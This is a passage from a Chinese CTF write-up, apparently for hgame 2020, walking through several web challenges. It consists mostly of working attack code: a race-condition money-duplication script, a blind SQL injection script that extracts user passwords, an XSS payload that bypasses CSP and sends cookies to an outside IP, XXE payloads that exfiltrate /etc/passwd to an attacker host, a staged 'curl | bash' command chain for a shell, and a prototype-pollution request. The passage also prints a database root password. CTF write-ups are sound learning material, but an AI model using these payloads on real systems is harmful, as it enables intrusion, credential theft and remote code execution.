-burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
-burp0_data = {&quot;ans&quot;: x}
-print(burp0_data)
-result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
-print(result)
-</code></pre>
-<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p>
-<p>admin,123456</p>
-<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p>
-<p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p>
-<p>我来模拟以下造成条件竞争漏洞的原因</p>
-<p>首先猜测以下solve和buy方法的流程</p>
-<pre><code class="php">function solve()
-{
-    #1. $num=从数据库中查找要用户持有的卖出商品的个数
-    #2. 如果数量足够,则进行下一步,否则返回并报错
-    #3. 在数据库中增加用户账户里的钱
-    #4. 在数据库中减少用户拥有该商品的数量
-}</code></pre>
-<p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p>
-<ol>
-<li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li>
-<li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li>
-<li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li>
-<li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li>
-<li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li>
-<li>b进程结束</li>
-</ol>
-<p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p>
-<p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p>
-<p>刷钱脚本</p>
-<pre><code class="python">from multiprocessing import Pool
-import requests
-def buy(num,loop=3):
-
-    for i in range(loop):
-        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;
-        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
-        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
-        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
-        if &quot;success&quot; in result:
-            print(&quot;successfully buy %d items&quot; % num)
-
-
-def solve(num,loop=3):
-
-    for i in range(loop):
-        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;
-        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
-        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
-        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
-        if &quot;success&quot; in result:
-            print(&quot;successfully solve %d items&quot; % num)
-
-if __name__==&#39;__main__&#39;:
-    i=0
-    while True:
-        p = Pool(100)
-        num=500
-        for i in range(100):
-            p.apply_async(buy, args=(num,))
-        print(&#39;Waiting for all buy subprocesses done...&#39;)
-        p.close()
-        p.join()
-        print(&#39;All subprocesses done.&#39;)
-
-        p = Pool(100)
-
-        for i in range(100):
-            p.apply_async(solve, args=(num,))
-        print(&#39;Waiting for all solve subprocesses done...&#39;)
-        p.close()
-        p.join()
-        print(&#39;All subprocesses done.&#39;)
-</code></pre>
-<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p>
-<pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, 
-&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]
-disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre>
-<p>一个个检测输入点发现,delete方法存在sql注入</p>
-<p>注入脚本</p>
-<pre><code class="python">import requests
-from bs4 import BeautifulSoup
-def send():
-
-    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;
-    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
-    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}
-    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
-    if res.status_code==200:
-        return 1
-    else :
-        return 0
-
-def get_id():
-
-
-    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
-    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
-    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-    html = res.text
-    try :
-        soup = BeautifulSoup(html,&#39;html.parser&#39;) #把网页解析为BeautifulSoup对象
-        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]
-    except:
-        return False
-    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)
-
-
-def check(mesid):
-    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
-    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
-    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)
-    if url in res.text:
-        return True
-    return False
-#index.php?method=delete&amp;delete_id=6594
-
-def delete(mesid):
-    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;
-    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
-    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)
-
-
-def sql_inj(sql):
-    mesid=get_id()
-    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)
-    if not check(mesid):
-        print(&quot;%s success&quot; % sql)
-        send()
-        return True
-    print(&quot;%s fail&quot; % sql)
-    return False
-
-# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)
-cha=&quot;0123456789ABCDEF&quot;
-result=&quot;&quot;
-p=0
-while True:
-    p+=1
-    temp=&#39;&#39;
-    for i in cha:
-        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):
-            result+=i
-            temp=i
-            print(result)
-            break
-    if temp!=result[-1]:
-        break
-
-#information_schema,babysql
-#messages,user
-#id,name,password
-</code></pre>
-<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p>
-<p>存在csp:</p>
-<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>先检测一下</p>
-<p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
-<p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p>
-<p>说object-src不安全</p>
-<p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p>
-<p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p>
-<p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p>
-<p>我们发送以下payload(用script标签也一样)</p>
-<pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p>
-<p>因为没有设置<code>object-src</code>我们可以用<code>embed</code>标签带回数据</p>
-<p>最后的payload</p>
-<pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;
-var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3b
-iframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3b
-eval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p>
-<h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;!DOCTYPE r [
-&lt;!ELEMENT r ANY &gt;
-&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
-%sp;
-%param1;
-]&gt;
-&lt;r&gt;&amp;exfil;&lt;/r&gt;
-
-File stored on http://39.108.164.219/evil.xml
-&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
-&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p>
-<pre><code class="php">&lt;?php
-include &quot;config.php&quot;;
-$result = null;
-libxml_disable_entity_loader(false);
-$xmlfile = file_get_contents(&#39;php://input&#39;);
-
-try{
-    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);
-    $stmt-&gt;bindParam(&#39;:id&#39;, $id);
-    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);
-    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);
-    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);
-
-    $dom = new DOMDocument();
-    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
-    $creds = simplexml_import_dom($dom);
-    $id = $creds-&gt;id;
-    $chal_name = $creds-&gt;name;
-    $level = $creds-&gt;level;
-    $time = $creds-&gt;time;
-    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {
-        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;请填写信息！&quot;);
-        die($result);
-    }
-    $stmt-&gt;execute();
-    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;已提交成功，正在为您安排打手&quot;);
-}catch(Exception $e){
-    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;提交失败！&quot;);
-}
-header(&#39;Content-Type: text/html; charset=utf-8&#39;);
-echo $result;
-?&gt;</code></pre>
-<p>config.php</p>
-<pre><code class="php">&lt;?php
-$dbms=&#39;mysql&#39;;
-$host=&#39;localhost&#39;;
-$dbName=&#39;bdctr_message&#39;;
-$user=&#39;root&#39;;
-$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;
-
-$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
-$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));
-$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-
-?&gt;</code></pre>
-<p>原本想着用gopher执行sql语句,但是有密码无法执行</p>
-<p>我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下</p>
-<pre><code>IP address       HW type     Flags       HW address            Mask     Device
-172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0
-172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0
-172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0
-172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0
-172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0
-172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0
-172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0
-172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0
-172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0
-172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0
-</code></pre><pre><code>127.0.0.1    localhost
-::1    localhost ip6-localhost ip6-loopback
-fe00::0    ip6-localnet
-ff00::0    ip6-mcastprefix
-ff02::1    ip6-allnodes
-ff02::2    ip6-allrouters
-172.21.0.76    hgame-private
-172.21.0.31    f9f1b9b99e13</code></pre><p>发现一个内网服务器<code>172.21.0.76</code></p>
-<p>当尝试访问80端口时,发现文件太大等一系列问题</p>
-<blockquote>
-<p>使用libxml读取文件时,文件不能太大否则会报错</p>
-</blockquote>
-<p>于是尝试压缩能不能读取</p>
-<pre><code>&lt;?php
-    error_reporting(0);
-    file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#39; &#39;,&#39;+&#39;,$_GET[&#39;a&#39;])));
-    $a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);
-    file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);
-?&gt;
-</code></pre><pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;
-&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><pre><code class="php">&lt;?php
-error_reporting(0);
-
-$token = @$_GET[&#39;token&#39;];
-if (!isset($token)) {
-    die(&quot;请带上您的队伍token访问! /?token=&quot;);
-}
-$api = &quot;http://checker/?token=&quot;.$token;
-$t = file_get_contents($api);
-if($t !== &quot;ok&quot;) {
-    die(&quot;队伍token错误&quot;);
-}
-
-highlight_file(__FILE__);
-
-$sandbox = &#39;/var/www/html/sandbox/&#39;. md5(&quot;hgame2020&quot; . $token);;
-@mkdir($sandbox);
-@chdir($sandbox);
-
-$content = $_GET[&#39;v&#39;];
-if (isset($content)) {
-    $cmd = substr($content,0,5);
-    system($cmd);
-}else if (isset($_GET[&#39;r&#39;])) {
-    system(&#39;rm -rf ./*&#39;);
-}
-
-/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _
-  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |
- | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |
-  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |
-  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|
- |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)
-                                    |/
-
-*/</code></pre>
-<p>然后利用 <a href="https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p>
-<p>的方法来执行命令</p>
-<pre><code class="php">
-&lt;?php
-    $a=file_get_contents(&quot;tmp.xml&quot;);
-    $command=array(
-    &#39;&gt;ls\\\\&#39;, 
-    &#39;ls&gt;_&#39;, 
-    &#39;&gt;\\ \\\\&#39;, 
-    &#39;&gt;-t\\\\&#39;, 
-    &#39;&gt;\\&gt;g&#39;, 
-    &#39;ls&gt;&gt;_&#39;,
-
-    &quot;&gt;bash&quot;,
-    &quot;&gt;\\|\\\\&quot;,
-    &quot;&gt;5\\\\&quot;,
-    &quot;&gt;00\\\\&quot;,
-    &quot;&gt;60\\\\&quot;,
-    &quot;&gt;9:\\\\&quot;,
-    &quot;&gt;21\\\\&quot;,
-    &quot;&gt;4.\\\\&quot;,
-    &quot;&gt;16\\\\&quot;,
-    &quot;&gt;8.\\\\&quot;,
-    &quot;&gt;10\\\\&quot;,
-    &quot;&gt;9.\\\\&quot;,
-    &quot;&gt;3\\\\&quot;,
-    &quot;&gt;\\ \\\\&quot;,
-    &quot;&gt;rl\\\\&quot;,
-    &quot;&gt;cu\\\\&quot;
-    );
-    foreach($command as $v)
-    {
-        echo $v.&quot;\n&quot;;
-        $v=urlencode($v);
-        file_put_contents(&quot;evil.xml&quot;,str_replace(&quot;TGT&quot;,$v,$a));
-        $postdata=&lt;&lt;&lt;MRK
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;!DOCTYPE msg [
-&lt;!ELEMENT msg ANY &gt;
-&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
-%sp;
-%param1;
-]&gt;
-&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;
-MRK;
-        $opts = array(&#39;http&#39; =&gt; 
-        array( &#39;method&#39;  =&gt; &#39;POST&#39;,
-        &#39;header&#39;  =&gt; &#39;Content-type: application/x-www-form-urlencoded&#39;,
-        &#39;content&#39; =&gt; $postdata ) 
-    );
-        $context = stream_context_create($opts);
-        file_get_contents(&quot;http://bdctr.hgame.day-day.work/submit.php&quot;, false, $context);
-
-    }
-
-
-?&gt;
-</code></pre>
-<p>在经历一次rm -rf 之后,终于拿到getshell</p>
-<p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p>
-<p><code>hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}</code></p>
-<h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹</p>
-<p>拿到题目,是我不熟悉的nodejs</p>
-<p>影响不大,看个大概就会了</p>
-<p><code>\route\index.js</code></p>
-<pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {
-  if (!req.session.sekiro) {
-    res.end(&quot;Session required.&quot;)
-  }
-  if (!req.session.sekiro.alive) {
-    res.end(&quot;You dead.&quot;)
-  }
-  var body = JSON.parse(JSON.stringify(req.body));//原型链污染起点
-  var copybody = clone(body)
-  if (copybody.solution) {
-    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)
-  }
-  res.end(&quot;提交成功&quot;+JSON.stringify(req.body))
-})</code></pre>
-<p>在注释处有一个奇怪的操作,转成json再转成解析成obj</p>
-<p>这摆明了有问题,遇到<code>JSON.parse+merge</code> ,思路可以往原型链污染上走一走</p>
-<p>我们继续阅读代码</p>
-<p>跟进dealWithAttacks</p>
-<pre><code class="javascript">this.dealWithAttacks = function (sekiro, solution) {
-        if (sekiro.attackInfo.solution !== solution) {
-            sekiro.health -= sekiro.attackInfo.attack
-            if (sekiro.attackInfo.additionalEffect) {
-                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
-                sekiro = fn(sekiro)//look this
-            }
-        }
-        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500
-        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0
-        if (sekiro.posture == 500 || sekiro.health == 0) {
-            sekiro.alive = false
-        }
-        return sekiro
-    }</code></pre>
-<pre><code class="javascript">var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
-                sekiro = fn(sekiro)</code></pre>
-<p>明显的代码执行,如果我们能控制<code>sekiro.attackInfo.additionalEffect</code>,那么便可以执行任意代码了</p>
-<p>我们看一下<code>sekiro.attackInfo.additionalEffect</code>是如何获得的</p>
-<pre><code class="javascript">this.attacks = [
-        {
-            &quot;method&quot;: &quot;连续砍击&quot;,
-            &quot;attack&quot;: 1000,
-            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,
-            &quot;solution&quot;: &quot;连续格挡&quot;
-        },
-        {
-            &quot;method&quot;: &quot;普通攻击&quot;,
-            &quot;attack&quot;: 500,
-            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,
-            &quot;solution&quot;: &quot;格挡&quot;
-        },
-        {
-            &quot;method&quot;: &quot;下段攻击&quot;,
-            &quot;attack&quot;: 1000,
-            &quot;solution&quot;: &quot;跳跃踩头&quot;
-        },
-        {
-            &quot;method&quot;: &quot;突刺攻击&quot;,
-            &quot;attack&quot;: 1000,
-            &quot;solution&quot;: &quot;识破&quot;
-        },
-        {
-            &quot;method&quot;: &quot;巴之雷&quot;,
-            &quot;attack&quot;: 1000,
-            &quot;solution&quot;: &quot;雷反&quot;
-        },
-    ]
-    this.getAttackInfo = function () {
-        return this.attacks[Math.floor(Math.random() * this.attacks.length)]
-    }</code></pre>
-<p>是从<code>attacks</code>中随机挑一个拿出来的,而其中某些是没有<code>additionalEffect</code>属性的</p>
-<p>根据js根据原型链来查找属性的特性</p>
-<p>我们可以用原型链污染来修改Object的additionalEffect属性</p>
-<p>payload:</p>
-<pre><code>POST /action HTTP/1.1
-Host: sekiro.hgame.babelfish.ink
-Content-Length: 169
-Pragma: no-cache
-Cache-Control: no-cache
-Accept: */*
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
-Content-Type: application/json; charset=UTF-8
-Referer: http://sekiro.hgame.babelfish.ink/
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
